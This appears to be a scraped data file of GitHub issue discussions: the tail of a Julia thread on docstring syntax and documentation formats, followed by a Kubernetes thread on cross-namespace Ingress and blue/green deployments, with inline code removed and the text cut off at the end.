whitespace) seems like the most widely used at this point, and is what is used in Jupyter/IJulia.  My understanding in #3988 was always that there would eventually be a special syntax for this; macros are only for prototyping.  Was syntax ever agreed upon for this? Something along the lines of Where  is a new keyword whose ending keyword is , ,  etc. Or just without the  at all and any unassigned string above a documentable block of code is taken to be a docstring?  Jeff and I just talked about this today and a bare string literal in void context followed by a definition seems like the way to go. This should be lowered by the parser something like this becomes the moral equivalent of this Important points about this approach  parsing has no side-effects – the construction of the documentation structure still occurs when the code is actually evaluated, not when it is parsed. each module has its own  dictionary; this is important for reloading modules. This ends up just appending all the docs for a given name, including separate doc strings for a single generic function.  An open issue is how to handle adding methods to functions from other modules. Does the definition go into the current module's  dict? What symbol is used for the doc key then?  Just to comment that it's super-exciting to see momentum on this. Looking forward to seeing what emerges.  Is using  as the key type a necessary requirement? Does doing this not restrict the kind of things that can be documented -- namely individual s of a ? If is instead translated to then you could use the / etc as the key instead of a  -- some adjustments to the -block not shown. Is this approach feasible? For adding docs to methods that are being extended from those in a different module, I'd be in favour of adding them to the current module's . I'd find it a bit odd if the docs I write for a method end up in a different module.  Stefan's proposal looks good to me, but plus one for being either being aware of methods properly or being limited to one docstring per function (as opposed to concatenating each successive dosctring regardless). Another way to do this might be something like i.e. indexing doc strings by type as well as name. Key points in this approach  The redefinition problem is handled at the function level rather than the module level, which means that Redefining functions/methods works in a sane way, as opposed to endlessly concatenating onto the existing doc string This will automatically make reloading modules do the expected thing too, so a module-local  isn't necessary to solve that problem (though it might be useful for other reasons)   It removes the dependency on the order of definitions. So you could do fancy things like making more doc strings for more general methods appear first.  (1.i) is my main concern – redefining functions messing up their own docs is something we could probably live with / work around / ignore, but if we can solve this early it will make for a much better interactive experience, I think.  Key problems with this approach  As discussed elsewhere (e.g. MichaelHatherly/Docile.jl#29), there is no need for documentation objects to be a string; they can be any Julia object with the appropriate  methods.   e.g. imagine a documentation object like .  A  keyword allows more generality here.   Docile currently allows additional metadata to be stored in the documentation, e.g.  Docile currently allows  vs.  in order to distinguish documentation for a  in general vs. documentation for a .  One possibility would be to make the  keyword optional for string literals (including string macros like ), but to allow it for more complicated documentation.  Documentation specific to argument signature is definitely better than concatenation, plus one for documentation being anything with a  method. A transformation like would also let us evaluate documentation objects only when they are needed. e.g.  could call the closure and cache the result.  I know that this is probably not a popular opinion but I really think we should consider using Restructured Text at least for the default markup in Base.   It supports everything we will want (inline math / code, cross-links, tables, etc.), supports extensions in the standard for functionality we would want to add, and would allow us to reuse all the tooling in developed in the Python world (Sphinx, ReadTheDocs, etc.) which imo is the best out there. Otherwise I see us developing yet another superset of Markdown to support our needs which may or may not be consumable by other tools.  I guess if we pick a superset with better tooling support (such as PanDoc markdown with all the extensions) we might be able to mitigate this problem.  These are good points. Having an API for this is key, as that will allow even more flexibility than a keyword. For fancy documentation needs, use the API instead of the special syntax. It's probably also true that we'll want to associate docs with particular type signatures. I think associating arbitrary metadata with every docstring is overengineering at this point. Where we are, we can't even ask for help for a simple function in a package.  ReStructured Text is awful. I wrote most of the original manual and writing it in Markdown was a pleasure. Writing documentation has been a painful chore ever since we switched from Markdown to RST. Having complicated formatting types for documentation is overkill and something that we can consider, if at all, only if there's strong evidence of a real need in practice. I don't think there will be any such need. There should be essentially no choice about documentation – the worst possible situation is one where everyone writes docs in their personal favorite format and there are a dozen of them. There should be one reasonable way to write docs that works well and that everyone is familiar with. What we generate during parsing should be simple and easy for the parser to construct – i.e. just strings – and these strings should look decent if you just show them as is. Markdown fits the bill perfectly – it is already (by design) how people intuitively markup plain text content.  @friend, as I've discussed in the abovementioned Docile issue, the plan for typical documentation objects (e.g. Markdown text) is to store only the unparsed string when the file is loaded.  Parsing of the AST, generation of HTML, etcetera, is only performed ""lazily"" when the help is requested in some format. @friend, the choice of format is orthogonal to this feature if my suggestion is adopted.   Markdown documentation would be  (creating a  object), Restructured Text would be  (creating a  object), etc.  Each would have appropriate  methods to generate text/html, text/latex, or whatever.   We can argue about what format should be used in Base elsewhere.  @friend, we absolutely have to have some kind of metadata if you want to have any possibility of generating offline documentation, because you can't just have a long list of 3000 functions in Base, sorted alphabetically.  At the very least, you have to be able to mark what section and subsection of the manual they should appear in.  Let's cross that bridge when we get there.  @friend, the antecedent of ""that"" in your comment is unclear.  I meant the issue of generating offline documentation. Alphabetical listings of documentation with a hierarchy implied by modules is what Java uses, and while that's not amazing, it does work. Indicating how to structure the presentation of docstrings seems like something that could easily be done by providing an external outline that references the objects to be documented in the desired organization.  We already have our functions well separated in modules and if this forces us to do some more refactoring, that is not necessarily bad.  @friend, we are ""there"" if we want to use this in Base, replacing our current RST documentation, because we need an offline manual.   It would be shortsighted to implement a feature that doesn't satisfy our own immediate needs! Hierarchies implied only be modules seem unacceptable to me, because most Julia modules have more functions than you would just want to list alphabetically ... our methods aren't nicely sorted into big class hierarchies like in Java, so the Java experience isn't a good analogue here. @friend, do you really want to separate Base into zillions of submodules?  Anything more than a dozen or so methods I would want to start grouping into subsections in a decent manual, and that would correspond to 100+ modules.  @friend if it is so awful why did you switch?  I'm assuming you wanted to use the tooling which is kind of case in point.  Regarding redefining functions &amp; concatenating strings, the way Docile does it (and the way I originally proposed) is that the documentation ( or whatever) is keyed by the  for the generic documentation, and by  for method-specific documentation, and in each case stores arbitrary objects.   Asking for  would normally give you the generic documentation followed by a list of method-specific docs for .  This way, redefining functions doesn't concatenate documentation. Presentation systems (e.g.  or offline docs) have more flexibility in how they order things.  e.g. they don't have to sort methods by the order they happened to be defined in, but can instead sort them by their type signatures or whatever.  And they can put different methods into a bulleted list or whatever format is desired. String concatenation is not appropriate anyway if documentation is an arbitrary object, e.g.  or .   ReST was not really our choice; I believe @friend just did the work and it was a very solid improvement at the time. I would be much happier if we could fix the infamous ""extra newline"" bug. But I agree there is something to be said for a format that's already designed for this very purpose. Can anybody comment on how python or other languages deal with metadata for docstrings? I'm not 100% opposed to it, but I think it is necessarily an extension of a simpler feature. For example, we are likely to support anyway; metadata involves further decorations of that syntax that can be optional.  @friend Honestly, I didn't want to switch, but someone (@friend, iirc) has already done the work and it was an improvement, so we just went with it. Read the docs is nice, but I still hate RST and I'm not that thrilled with the rest of the tooling around RST (random newlines anyone?). If we choose RST as a format, we're stuck with it. If we choose a format we like, we can build all the tooling we need.  I'm confused about how the void string idea is going to work in the REPL. If I type a string into the REPL, then hit enter, what happens?  @friend Nothing – it has to be a string in void context followed by something that it can be attached to in the same input.  So it will matter whether I execute string + code at two prompts or string at prompt, then code at prompt?  Isn't metadata something that can be handled within the docstring? Pandoc and Jekyll for example both support YAML front matter in markdown docs to attach arbitrary metadata. We also already have pure Julia Markdown and YAML parsers.  The lack of structured information in Python has been a longstanding problem, as I understand it. Syntax-wise, I would suggest something like the following That is, you would use the  keyword for anything more complex than a string literal (or string macro).  e.g. for generic documentation objects (not strings), or to provide metadata (a Dict of some kind) which could be a variable as in the last example (to share metadata for several related functions).  plus one to metadata inside the doc string.  Do you anticipate entering a lot of doc strings at the prompt?  Metadata inside the docstring implies that construction cannot happen lazily as you would have to parse all docstrings (or eval if they are objects) before you could properly organize them.  Problems with putting the metadata inside the docstring  It requires us to have ""Julia-flavored"" markdown (or whatever) with our own magic metadata markers. It requires us to specify a docstring format, rather than separating format from metadata, and relying on  to convert arbitrary objects to output formats. It makes it hard to share metadata ... e.g. you will often have several methods with the same metadata (e.g. they are all in the section ""Mathematical functions"" and the subsection ""Special functions"" as in my example above), and it would be a lot nicer to not have to retype this in each docstring.   Package loading is already a performance problem – constructing lots of dicts during parsing is going to make it way worse.  Metadata could be a list of pairs  and then the overhead would be smaller.  I have zero problem with there being a Julia-flavored markdown format. I suspect it is inevitable. We should try to make sure that it matches the IJulia-flavored markdown as much as possible.  YAML has a standard document begin/end markers. I don't see a standardized docstring format as a bad thing. YAML supports references. So you could write the full metadata once, tag it, then reference it in other docstrings.  I think that having the organization of how doc strings are presented be external to the code and docs is a better approach. I.e. you have an outline where you refer to entities that have doc strings and a tool that weaves this together into HTML pages that can go online. Trying to cram all of the information needed to weave individual doc strings into a coherent final document just isn't going to work well. The doc strings provide bits of content that can be either consumed individually from the REPL or reused when putting together complete documentation. Putting all the organization and metadata into the doc strings is like a worse version of literate programming, which itself hasn't panned out that well.  @friend, I just did a little benchmark.  ing a file defining 10,000 random string constants took 1.47 seconds, while ing a file defining 10,000 random  dictionaries took 3.16 seconds.  This difference doesn't seem that substantial to me, especially since most modules will define much less metadata than this.  2x slower is huge considering the the massive amount of work you have to go through to make the frontend 2x faster.  @friend, losing a factor of 2 in something that only takes 1% of the total loading time for a module means losing a factor of 1%. That being said, having to put a separate placeholder in an offline ""manual outline"" for each function that you want to appear there does not seem terrible to me.  Good documentation combines introductory and transitional material with bits of reference. An outline document is a good place for the introductory and transitional material, and it can simply splice in doc strings in the appropriate places. That way the details remain up-to-date and near the definitions of the functions being described, while the code isn't cluttered with lots of prose, and it isn't forced to be concerned with the structure of the documentation, which often doesn't match the structure of the code.  So basically, I'm proposing this for the overall documentation  doc strings provide bits of markdown-flavored reference material associated with specific objects and symbols there is no structure and no metadata for doc strings beyond this – they can be queried and displayed in the REPL or in other interfaces like IJulia and Juno, but they're just organized like a key-value store. high-level documentation is written in the same markdown-flavored format, but it can easily splice in bits of doc string so that the material stays in sync and doesn't have to be repeated.   I don't understand how you'd ""easily"" plug in doc strings. It seems easier indicate sections next to the methods; how do I indicate which function/method I want to plug in, in the outline-thing? (vs. writing the outline/intro material and then plugging in the whole section of docstrings at once.) On Tue, Sep 30, 2014 at 1048 AM, Stefan Karpinski &lt;notifications@friend.com  Totally on board for 1 and 3. I would still prefer to support in-docstring metadata, but I see it as non-essential, and could easily be added later. One issue with splicing in docstrings is that adding a new method necessitates changing the documentation in two places (docstring, and external docs). Whereas metadata would allow defining groups of docstrings to splice in together. I could imagine using a template system like mustache. So external docs would look like  Yes, just what @friend said. I think some amount of metadata in doc strings makes sense – just enough so that you can query them by keywords or something. That could easily be satisfied by having a convention that writing  at the bottom of a doc string allows the string to be retrieved by keyword queries. Making this mechanism fully programmable strikes me as asking for abuse and overcomplication.  Does  mean the function-level documentation or all documentation? What if I only want one method of ? On Tue, Sep 30, 2014 at 1116 AM, Stefan Karpinski &lt;notifications@friend.com  I can tolerate omitting generic metadata, but I would strongly prefer using custom string (or other object) types to indicate format, with  for output.  Writing  instead of  is only two extra characters, which is a small price to pay for not locking ourselves into Markdown for the next 20 years. We'll want a string macro anyway, so that we don't need to escape  or  in code samples or LaTeX equations.  LaTeX equations are basically unusable without a string macro to suppress escaping.  Base can ship with only  () (and also text/plain strings, of course), which will serve the purpose of encouraging everyone to use the same format.  (Though as soon as you start thinking about adding custom markdown extensions like keywords, I think the issue of metadata should be revisited.  If you think that creating metadata dicts will slow down loading, wait until you actually try parsing the docstrings at load time.   If you separate the metadata and the docstrings, each docstring need only be parsed when it is displayed.   Dicts are  way more flexible, will arguably be easier to implement because they use the existing parser, and don't require custom markup flavors.)  I am extremely hawkish about load time but I'm not really worried about the slowdown from metadata dicts on docstrings, for reasons that have been discussed already (1) they're not all that slow, (2) not all docstrings will have them, (3) they can be shared among docstrings. My main concern is getting something simple working first so we can have help and docs for packages ASAP. After that there are concerns about complexity and where various information should be stored, but we can continue to discuss that while enjoying the availability of package help )  plus one to having something that works for packages asap.  Yes, plus one to having something vaguely like what's been discussed in this thread soon. I'm happy to adjust Docile to match whatever makes it into Base so that 0.3 packages can have documentation too.  I agree that we should get something asap, with the caveat that major flaws and disagreements should be things that are resolvable later without much breakage. Adding documentation metadata is something that can be done later without breakage, because most docstrings won't have metadata so we will want an optional syntax anyway. Changing  to  if you want markdown-syntax docstrings will be a painful breakage to impose later.  Regarding the  vs  change, if the default is markdown, then changing later is a matter of making markdown the default and allowing other formats optionally. It strikes me as weird to indicate the flavor of markup on a per-doc-string basis. Are you going to use lots of different markups in a single file or even a single project? I'm really not convinced that we'll ever need more than one.  @friend, note that we'll need a string macro anyway in order to easily use LaTeX equations in Markdown (otherwise you have to backslash like crazy).  That would be true if we couldn't change the parser ;-)  I would prefer format-agnostic documentation (requiring only writemime). I don’t think “getting something out fast” is affected by which of these we chose. Making something work for special Julia Markdown strings only vs. an equivalent MarkdownString type doesn’t seem like a big difference as far as implementation effort. Forcing everyone to use the same format seems unfortunate. I agree with having a strong default (i.e. shipping and using only one format in base), but choosing not to support any other format is actively preventing anyone from ever using a different format. There is always some dissent about formats, and if someone strongly prefers rst for their project (for the toolchain, or whatever), then there’s no reason to actively prevent them from doing so. An example of using different types of documentation in one package some documentation might be in a separate file, so those functions would just like to refer to the file path &amp; have the file actually read lazily. This could be accomplished with a different type (FileDocString or whatever) that behaves appropriately. Allowing user-defined documentation formats would also allow users to define their own extensions to Julia Markdown -- and try them out without forcing them on anyone else or needing to modify the Julia parser.  FWIW I'm in violent agreement with @friend w.r.t allowing whatever system we end up with to store arbitrary metadata, not just strings. My impression is that the clojure community (e.g.) has benefited tremendously from this and built some really cool stuff (core.typed anyone?) on top of it, and it seems uncharacteristically restrictive (for what I see as the ""Julian"" attitude about this sort of thing) to not allow it.  What @friend said! Just learned about how Clojure does this  - very neat! IMO a good implementation would make documentation a special case of a general mechanism to attach metadata to certain kinds of objects. (at least under the hood while providing sufficient syntactic sugar.) ref #3988  which, unless I'm mistaken, is exactly what @friend has been arguing for.  I like the idea of having ""..."" / """"""...""""""be Julia's default Markdown, whatever flavor that is, so we and our tools don't have to think very hard about how to deal with basic comments. I'd also like to see provision, even if just a placeholder for now, to add flexible metadata.  Although most docs right now are either plain text or rich text, there are plenty of areas where a picture or equation would really help, and with tools like IJulia and Juno we already have much of the infrastructure required to serve rich help.  Note also that if we support attaching an arbitrary ""documentation"" object with output via , then including dictionaries of metadata can be implemented on top of this.  e.g. you can have a  type that wraps the ""actual"" documentation object plus a  dictionary of other metadata (Where, as I mentioned above, we probably need an optional  keyword for any documentation object that is not a string literal or string macro.)  FWIW, I find @friend's suggestion really compelling. It seems much easier to make an initial pass that's very vague about what ""should"" go in a MetaDoc object and flesh it out, than to take a stricter rule about strings and later replace it with MetaDoc objects.  I'll just note as a minor point that using some kind of clue, like  or  or whatever, would make things much simpler for editors' and IDE's highlighting, for properly displaying special characters, LaTeX etc., since we can't really expect editors to implement full-blown parsers. Maybe that could be mitigated by using ""a string at global scope is documentation"" as a proxy rule, but I suspect that could turn out messy.  We already have a concept that for creating new syntactic elements, and they are called macros and string macros. Having different rules for  in different contexts would be inconsistent, making Julia more confusing. I'd argue that two extra letters to type for Markdown parsing isn't a big problem. If you use markdown for formatting your documentation, you'll probably have a multiline doc, and two characters seem like a small annoyance. I agree that it is poor style to mix different documentation formats in a single file, it might sometimes be useful. That way you can gradually change format in a file without having to fix all the issues at once. Usually design discussions in Julia has not been won by the argument ""someone is going to use this feature to write horrible unreadable code"".  I have to disagree with this. Firstly, a lot of docstrings are likely to look like i.e. not multiline. That said, it's not really about the two character overhead. The fact is that most people will use the most the most convenient documentation form available, so defaulting to plain docstrings amounts to endorsing them. I'm all for supporting richer formats ( etc.) but supporting both plain and rich docs doesn't make much sense – markdown opens a lot of opportunities (nice presentation, syntax highlighting, structured information etc.) without making things more cumbersome, so we should encourage people to use it over plain text as much as possible. Treating  docstrings as  is a very simple and effective way to do that.  This is a good idea. One of the problems with Python docstrings is that they are plain text, and you can't get people to use anything else unless it's endorsed by the language implementation. TIMTOWTDI leads to everyone using the lowest common denominator, i.e. plain text. Unambiguously going with one default markup language in Julia makes it better. Markdown is a good choice, especially as IJulia is the de facto ""more than plaintext"" display environment for Julia.  Putting myself in the loop to make sure Lint can check through doc string correctly.  I think that rather the problem with Python docstrings is that there is no standard way of specifying the format. That means that when you aggregate documentation from docstrings, you have to guess the format, and computers are bad at guessing, so the feature is little used. @friend Maybe that is a valid case, but if I want to save characters to type I'll rather not have to repeat the signature inside the docstring, but have it automatically captured from the actual signature on the next line.  By the way, another reason to support (a) plain-text strings and (b) non-literal documentation strings is importing help from other languages. e.g. in PyPlot I define various functions which are wrappers around Python functions, and I want their help to be automatically imported from the Python docstring.  If we have a  keyword (or ) that supports arbitrary Julia expressions, and allows plain-text strings, this will be easy  Just checking in here to see if we have something usable to start with. Are we still waiting on ?  Markdown.jl is already in that other PR (which is good to go as far as I'm concerned, though I'm happy to make any changes if I've missed anything of course).  Oh yeah we can totally close this ",150,39,875,0,0,506,26,
kubernetes/kubernetes/17088,0.114817241,kubernetes,kubernetes,Cross-namespace Ingress,37320,389,233,0,10,"As far as I can tell right now it's only possible to create an ingress to address services inside the namespace in which the Ingress resides. It would be good to be able to address services in any namespace. It's possible that I'm missing something and this is already possible - if so it'd be great if this was documented.  Nope, not allowing this was a conscious decision (but one that I can be convinced against). Can you describe your use case? The beta model partitions users on namespace boundaries and disallows service sharing across namespaces. You might argue that you want a single loadbalancer for the entire cluster, to which I ask, what is in the namespaces? i.e why not use 1 namespace if you want to allow sharing.  @friend I'm running multiple projects on a cluster - kubernetes tests, blog, API for a project. I want to address these as subdomains on my domain using a single ingress controller because load balancers and IP addresses are expensive on GCE.  It was intentionally avoided. Cross namespace references would be a prime source of privilege escalation attacks. cc @friend/kube-iam  I'll close this for now, makes sense.  FWIW you can set up a Service in namespace X with no selector and a manual Endpoints that just lists another Service's IP.  It's yet another bounce, but it seems to work. ) On Thu, Nov 12, 2015 at 514 PM, Jordan Liggitt notifications@friend.com wrote  I would tend to imagine the use case that @friend described is common.  I'm looking at an ingress controller as a system component and a means of reflecting any service in the cluster to the outside world.  Running one (perhaps even in the  namespace) that can handle ingress for all services just seems to make a lot of sense.  That depends on what you have in your namespaces right (which is why i asked for clarification)? Isn't it only risky IFF you're partitioning users across a namespace security boundry?  There seems to be demand for cross namespace ingress x service resolution. We should at least reconsider.  Might be good to revisit this now in 2016 )  @friend/kube-iam thoughts/volunteers to implement an admission controller? Do we authorize based on the user field of a request today or is that unprecedented?  I think I'd want some record or indication of the cross-namespace relationship to exist, so the targeted service could know it was exposed. I want to avoid the scenario where someone had access to a service (legitimately or otherwise), set up ingress from other namespaces, then had their access removed and continued accessing the services without the service owner's awareness. The authorization layer is based on the user info on a request. This would be the first objectref authorization I know of.  @friend's raises some good concerns.  I broke them down into two cases when thinking about them.  assuming everyone is trustworthy, it might still be hard to reason about the network security of a service just by looking at the service object (or just by looking at objects in the same namespace).  IT might be misconfigured.  I agree with this, to a point however, creating an object that represents a connection between two services seems like it would scale poorly.   we need a solution that scales with the number of services, not the number of interconnections, I think.   assuming there is someone not-trustworthy, they can misconfigure they network in a way where the misconfiguration persists after some of their access is revoked. Yes.  But we have this problem worse with pods, configmap, etc.  The bad actor might have run pods that that are doing the wrong thing, and auditing this is very hard.     Is this moving into the topic of micro-segmentation and access policy? On Wed, Jan 20, 2016 at 219 PM, Eric Tune notifications@friend.com wrote  The two main models proposed for network segmentation are 1) decorate Services (and maybe Pods) with a field indicting ""allow-from"". This basically allows one to draw the directed graph of an application, sort of. 2) implement a ""policy group"" object which selects Pods to which to apply policy, and includes some simple policy statements like ""allow-from"" On Thu, Jan 21, 2016 at 1152 PM, Tim Hockin notifications@friend.com wrote  @friend what issue does one go to to learn more and comment?  It's being discussed in the network SIG mailing list as we haggle over multitudes of ideas and whittle it down to a few viable ones. Start here  proposal  is in email  Fri, Jan 22, 2016 at 1246 PM, Eric Tune notifications@friend.com wrote  Talked to @friend and @friend  It sounds like the Ingress resource may undergo some refactoring this quarter, possibly splitting into two objects.  We should revisit ingress security when those discussion happen.  This would be a nice feature to have.  For example, someone who wants to offer  a pseudo multi-tenant solution - with each tenant running in a separate namespace.  The ingress could do hostname based routing to the right backend namespace.   ${tenant}.example.com  -&gt;  service ""foo"" in namespace ${tenant} I suppose one can do this today on GKE, but I gather you end up with one HTTP load balancer per namespace  - which could get quite expensive and seems unnecessary.  This limitation throws a big wrench in how my company was planning to use ingresses. Our use case is running multiple copies of the same application stack at different versions, and to keep the stacks isolated from each other, we use namespaces. We'd planned to run a single ingress controller that knows how to determine which applications and versions of those applications by the subdomain of the incoming requests. The reason for using namespaces for isolating these stacks are  To be extra safe about not having applications interfere with each other based on what else happens to be running in the cluster or from similarly named services. To get around name collisions for services. It's not possible to have two services in the same namespace with the same name, so application dependencies like ""redis"" or ""mysql"" need to be in different namespaces to use those simple names without faking a namespace by changing the name of the service.  See my unanswered Stack Overflow question, Kubernetes services for different application tracks, for more details on our use case. Our ingress controller is exposed to the outside world via NodePort (80 and 443), and we have an ELB in AWS pointing at the whole cluster. With the namespace restriction for ingresses, we'd need one ingress controller per namespace and there would be no way to have a single ELB forwarding ports 80 and 443 to the cluster.  @friend You should use the approach that our group is using for Ingresses. Think of an Ingress not as much as a LoadBalancer but just a document specifying some mappings between URLs and services within the same namespace. An example, from a real document we use We make one of these for each of our namespaces for each track. Then, we have a single namespace with an Ingress Controller which runs automatically configured NGINX pods. Another AWS Load balancer points to these pods which run on a NodePort using a DaemonSet to run at most and at least one on every node in our cluster. As such, the traffic is then routed Internet -&gt; AWS ELB -&gt; NGINX (on node) -&gt; Pod We keep the isolation between namespaces while using Ingresses as they were intended. It's not correct or even sensible to use one ingress to hit multiple namespaces. It just doesn't make sense, given how they are designed. The solution is to use one ingress per each namespace with a cluster-scope ingress controller which actually does the routing. All an Ingress is to Kubernetes is an object with some data on it. It's up to the Ingress Controller to do the routing. See the document here for more info on Ingress Controllers. With this post I will close this issue because I think it's actually a non-issue - Ingresses work fine even for cross namespace routing. Eventually the ingress object might be refactored / split. That would be a redesign of this concept. But as of now, this is how Ingresses are designed and meant to be used, so it only makes sense to use them the ""right"" way )  I might open up another issue about actually properly documenting this with examples. Seems there's some confusions around Ingresses. They're really powerful when applied correctly.  I think your @friend was the wrong person. P I understand the difference between ingress resources and the ingress controller, but I'm not sure I understand why my use case is not appropriate here, or how the setup you describe does the same thing we're trying to do. In our imagined setup, the ingress controller and all ingress resources exist in one namespace. However, we create ingress resources that map host names to services in more than one namespace. This way we can access apps from outside the cluster as ""my-app.app-version.example.com"" and the request follows the path ELB ♢ random node ♢ ingress controller ♢ my-app in the my-app-my-version namespace.  Yeah whoops. I just assumed the first jimmy in the @ list was you. There's absolutely no reason to have your ingress resources in one namespace, as far as I can tell. What's keeping you from putting the routes for your app into a single Ingress object and then replicating this object for each namespace you want to run? It just makes sense from a symmetry perspective - if every namespace has the same set of objects, including the ingress object, then everything will work properly...  I don't think duplication of ingress objects would be a big deal, but needing an ingress controller for each namespace would be a problem, as we want to have a single entrypoint for requests going into the cluster. If each namespace had it's own ingress controller, we'd need a separate ELB with its own DNS records for each namespace, which is not something we want.  @friend Read through my comment again. I said you would have a single ingress controller for the entire cluster, exactly as you want...  It does look like I misunderstood what this issue was about! It sounds like ingress controllers do work across namespaces, but ingress resources cannot see outside of their own namespaces, which was the subject of this issue. Apologies for the confusion and thanks for your responses!  @friend I had the same confusion up to a point.  I read this discussions many times and still do not understand what is the recommended way to achieve the desired goal of multiple sub/domains to be served from different namespaces. My first workaround is to use single namespace with Ingress for everything that should be exposed via domain name to the world. And the second way is to not use Ingress, but a simple Nginx as a proxy to my apps in different namespaces. Isn't the goal of Ingress to simplify this scenario? There is mentions about security implications if crossing the namespace. However, there is no simple explanation of them. @friend Could you please share more details about what are those pods, which reside with the Ingress Controller?  I think I need to be able to reference services in different namespaces from a single ingress controller. My use-case is doing blue/green deployments, with a ""blue"" namespace and a ""green"" namespace. My application's public traffic comes via an ingress controller. I would like to be able to route that traffic to blue or green services via making a small change to the ingress controller (i.e. the service namespace).  You're both still missing the point, you can use a single ingress controller for as many namespaces full of ingresses you want  @friend Yes, I did understand that this is possible. What I am missing is how you do that? Does the controller receive events for ingress resource in every namespace, no matter in which namespace the controller resides in?  And I was not understanding that when I weighed in on this way back when. Given my current understanding, I actually have come around to believing there's no issue or truly damning limitation here.  @friend I believe I am the same as @friend in that I do not understand how to achieve my goal. Please let me explain. I am trying to implement the blue/green deployment pattern using ""blue"" and ""green"" as my namespaces - each namespace hosts my application stack at different versions. My desire is to have a single Ingress resource routing traffic for  to, e.g. the blue namespace, and then at the point of release, make a change to that Ingress so that now traffic is being routed to my green namespace (without the public IP of that Ingress changing). Unfortunately I believe all the solutions mentioned above require interaction with some entity outside of Kubernetes, e.g. an external load balancer, which is not desirable. If it helps, I'm on Google Container Engine. I hope now that we are on the same page? My problem is that if I believe that without a service namespace selector, I can't achieve what I want to achieve.  @friend nope, still doable without a namespace selector. Remember that an ingress controller does not change ip between different ingress resources. It just combines them together and serves them. Try running the nginx controller for example, and setting up what you want. You can either use a different URL in one namespace, and then change it to the main URL when you want to enable that namespace (kubectl edit it) or you can write a little bash script that deletes the ingress object in one namespace and immediately recreates it in the other. The main thing I think you're missing is that the ingress objects are just data. Deleting them doesn't actually cause kubernetes to delete any resources. The ingress controller however is watching for changes to these resources and uses them to update its configuration. For the nginx controller this means updating the nginx.conf which does not change anything about how you chose to route traffic to the nginx pods. The IP remains the same.  @friend yes. It depends on their implementation, but most of the controllers monitor all the namespaces on default (which is changeable)  @friend thanks for your help, however I believe that it is not possible to change the namespace of an ingress object using  In this operation I attempted to change the namespace of the Ingress resource to , where it was previously . Additionally if I delete this (my only) Ingress resource, I lose the IP address which Google Cloud load balancing has provisioned for me. Perhaps this behaviour would change if I had another Ingress resource.  one thing i don't seem to be able to understand is why insist on ingresses not being able to use services from other namespace, when there aren't any security measures in place (as far as i know) to prevent any pod from just using the  fqnd to get data from another namespace.  or is the fact, that this is possible a security flaw, that will be fixed in future versions? update this is what i mean  @friend I believe the intent is that cross namespace service access will not be allowed in the future.  put then the question still stands why not have a certain kind of flag or even  to allow cross-namespace access to certain pods or have a service definition which namespaces they can be accessed from. without this there would be a nn (namespaceingress-host) relation between namespace and hosts that expose them, while it would be nicer to have a n1 relation to cut down on costs for additional public facing static-ip hosts.  @friend I'm not familiar with how the Google Cloud router works with Ingress right now. However. If you use the nginx ingress controller and point a LoadBalancer at the ingress controller you will get what you want - a single stable IP address TCP load balancer created by the Service pointing to a horizontally scaleable nginx layer. Moving Ingress objects between namespaces just updates the Nginx configuration, and does not release any IP addresses. It'll also give you more direct control over how the router works, and might save money on Google Cloud resources. The Google Cloud implementation SHOULD keep a single IP address and make HTTP rules in that balancer to point to however many Ingress objects exist in the cluster - that might not be the case right now.  @friend thanks for the suggestion, I haven't tested it, however I am leaning towards a similar solution for my specific requirement by using a LoadBalancer as you suggest to point to my own nginx-based router's service. This approach uncovered a bug in , see #40870. I'm afraid that I have currently put this issue down while I am working on other priorities, but I will be able to return to this problem and conduct some conclusive tests of this suggestion and other suggestions in this thread. I apologise that I don't have time to do this right now. I also think that, so far, efforts in achieving my goal should be documented in a new thread entitled ""Support blue/green deployments"", as this issue is very clearly ""support cross-namespace ingress"" and the answer seems to be a firm ""no, we won't"".  @friend in my instance, my frontend app connects to its component services using DNS as service discovery. They connect to a static name, e.g.  or . By deploying different versions in different namespaces, we get 100% satisfactory service discovery. We are unwilling to implement a different method of service discovery for the following reasons  More complexity brings more opportunity for failure. More per-deployment environmental configurations brings more opportunity for failure through less deployment parity. Our local dev setup is using pure Docker networking which is compatible with this DNS-based approach (which is a design feature of , I believe).  We are very satisfied with this approach in every way, with the exception that cross-namespace load balancing (switching) is impossible with pure-k8s at the moment.  @friend at some point between you making this comment and today, this functionality regressed. See #40870. I would appreciate it if you could accelerate @friend's request for a second opinion on that thread please!  If you need a huge design change in something like Kubernetes to do a relatively common deployment pattern, you're doing it wrong. I rest my case, but urge you to rethink your approach. Reread the docs on how DNS and pod ips work, particularly around multiple / cross namespace communication. Namespaces are used usually in a one namespace per deployment fashion - one for prod, dev, etc although the isolation they provide can be used for other things too.  @friend please re-read my response to your suggestions. You suggested using a LoadBalancer service to direct traffic to the correct endpoint. I have tried this and this functionality does not work as described in the documentation. I tried your suggestion of multiple Ingress resources, and that didn't work. I also took inspiration from this, and tried having multiple Ingress resources in different namespaces, and changing which HTTP host they were configured for. This also didn't work - traffic was never re-routed, and I could confirm that the underlying Google Cloud routing rules had not been updated. I apologise for not reporting this, however at that point I had already given up on using Ingress for my solution - I understand and accept that this is not what it's for. I have merely been replying to your suggestions. That is why I intend to open a new issue, as I have not yet seen any workable solutions that function as advertised. I'm not sure why you have now taken this hostile attitude, but I am disappointed that you seem to think I am stubbornly ignoring your help. Trust me, I am VERY eager to solve this problem. Thank you for continuing to help me, but please could I ask that if you think you have suggested workable solution, could you re-iterate it so there is less confusion between what you think works, and what I think works?  You've still not read and understood my suggestion, which means at this point you're probably skipping reading anything I'm posting at all. Remember that I'm the one that made this issue in the first place, and yes, I was in the exact same position with the exact same deployment model as you. I suggested using a Nginx Ingress Controller from the official kubernetes ingress controller implementations, and directing a load balancer at that ingress controller to get a stable IP. From what you've said above it seems you misunderstood. This is exactly what ingress is for, so don't give up yet.  OK, I think I understand your suggestion, but let me play that back to you  Create an nginx Ingress Controller so that we have something we can route to. Create a LoadBalancer service and include the Ingress Controller in its selector. OK great, now we have a single IP, all Ingress resources are served under this IP. Create an Ingress resource under some given namespace, and specify our app's HTTP endpoint service as the backend. We're now serving our live app.  All good so far.  Now, we want to serve the new release. What happens? Delete the Ingress resource in the previous namespace, and create the same Ingress resource in the new namespace? OK... that will cause a service interruption, but maybe I can live with that.  Now we're serving the newest release with a small loss of service.  Next up, we want to test the development release (as per the blue/green pattern). It's deployed to a new namespace. Problem - how do I route traffic to it? Any Ingress resource can only use the single LoadBalancer IP I first created, so I can't differentiate the traffic as I can't add another IP. Unless... I use the hostname-based routing functionality of Ingress? I guess we can additionally configure static DNS names, but it's extra complexity.  If this is what you're suggesting, then I'm not really inclined to proceed with Ingress, and would rather pursue the service-to-service approach as described in the documentation and suggested by thockin. However, I can see that it would just about fit our use-case, so thank you.  Ingress is designed to do http 